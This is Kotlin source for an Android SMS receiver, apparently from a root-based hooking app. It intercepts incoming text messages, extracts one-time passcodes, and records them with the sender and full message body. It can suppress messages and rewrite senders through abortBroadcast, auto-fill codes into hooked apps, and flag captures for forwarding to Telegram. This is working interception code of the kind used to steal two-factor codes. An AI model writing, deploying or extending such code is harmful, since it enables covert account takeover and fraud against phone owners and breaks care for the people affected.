package com.hivirtus.zygiskmode

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log

class SmsInterceptReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        if (!PermissionHelper.smsReady(context)) return

        val pending = goAsync()
        try {
            val parts = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return finish(pending)
            if (parts.isEmpty()) return finish(pending)

            val sender = parts.firstOrNull()?.originatingAddress?.trim().orEmpty()
            val body = parts.joinToString("") { it.messageBody.orEmpty() }.trim()
            if (sender.isBlank() || body.isBlank()) return finish(pending)

            val appContext = context.applicationContext
            val configManager = ConfigManager(appContext)
            val config = configManager.load()

            if (SmsSenderRewriter.shouldRewrite(sender, config)) {
                try {
                    abortBroadcast()
                } catch (_: Exception) {}
                SmsSenderRewriter.rewriteOnReceive(appContext, config, sender, body)
            }

            if (!SmsMatcher.shouldCaptureIncoming(config, sender, body)) return finish(pending)

            val interceptDisplay = SmsMatcher.interceptDisplay(config, sender, configManager)
            val token = SmsMatcher.extractToken(body, config.autoExtractOtp)
            val otp = LastOtp(
                otp = token,
                sender = interceptDisplay,
                body = body,
                phone = interceptDisplay,
                messageLabel = SmsMatcher.matchedHookedApp(config, sender, body)?.displayName.orEmpty(),
                direction = "incoming",
                rawPeer = sender,
                capturedAt = System.currentTimeMillis()
            )
            OtpCaptureWriter.write(appContext, otp)
            OtpAutoFillHelper.onHookedOtpCaptured(appContext, config, otp)
            if (SmsMatcher.shouldForwardToTelegram(config, sender, body, "incoming")) {
                appContext.sendBroadcast(
                    Intent(ACTION_SMS_CAPTURED).setPackage(appContext.packageName)
                )
            }
        } catch (e: Exception) {
            Log.w(TAG, "SMS intercept failed: ${e.message}")
        } finally {
            finish(pending)
        }
    }

    private fun finish(pending: PendingResult) {
        try {
            pending.finish()
        } catch (_: Exception) {}
    }

    companion object {
        const val ACTION_SMS_CAPTURED = "com.hivirtus.zygiskmode.SMS_CAPTURED"
        private const val TAG = "SmsInterceptReceiver"
    }
}
